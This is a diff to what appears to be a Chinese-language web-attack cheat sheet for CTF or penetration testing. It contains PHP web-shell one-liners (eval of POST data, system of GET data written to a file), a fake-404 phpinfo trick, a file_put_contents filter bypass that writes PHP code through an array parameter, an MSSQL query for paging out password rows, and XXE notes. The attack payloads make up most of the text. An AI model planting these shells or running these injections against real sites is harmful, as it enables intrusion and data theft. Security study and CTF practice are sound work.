@@ -91,6 +91,12 @@ echo ^<?php eval^($_POST['a']^); ?^> > a.php
 
 <?php fwrite(fopen("gggg.php","w"),"<?php system(\$_GET['a']);");
 
+<?php
+header('HTTP/1.1 404');
+ob_start();
+phpinfo();
+ob_end_clean();
+?>
 
 A=fl;B=ag;cat $A$B
 
@@ -302,6 +308,17 @@ A=fl;B=ag;cat $A$B
     - 原理：sprintf實作是用switch...case...
         - 碰到未知類型，`default`不處理
 
+## file_put_contents
+
+- 第二個參數如果是陣列，PHP會把它串接成字串
+- example:
+    ```php
+    <?php
+    $test = $_GET['txt'];
+    if(preg_match('[<>?]', $test)) die('bye');
+    file_put_contents('output', $test);
+    ```
+    - 可以直接`?txt[]=<?php phpinfo(); ?>`寫入
 
 ## 路徑正規化
 
@@ -604,6 +621,11 @@ cat $(ls)
 - 註解：
     - `--`
     - `/**/`
+- TOP
+    - MSSQL沒有`LIMIT N, M`的用法
+    - `SELECT TOP 87 * FROM xxx` 取最前面87筆
+    - 取第78~87筆
+        - `SELECT pass FROM (SELECT pass, ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS LIMIT FROM mydb.dbo.mytable)x WHERE LIMIT between 78 and 87`
 - 其它：
     - db_name()
     - user_name()
@@ -1444,6 +1466,9 @@ https://github.com/cujanovic/SSRF-Testing
 ```
 
 ## 外部實體
+
+- `libxml2.9.0`以後，預設不解析外部實體
+- `simplexml_load_file()`舊版本中預設解析實體，但新版要指定第三個參數`LIBXML_NOENT`
 
 ```xml
 <!DOCTYPE kaibro[
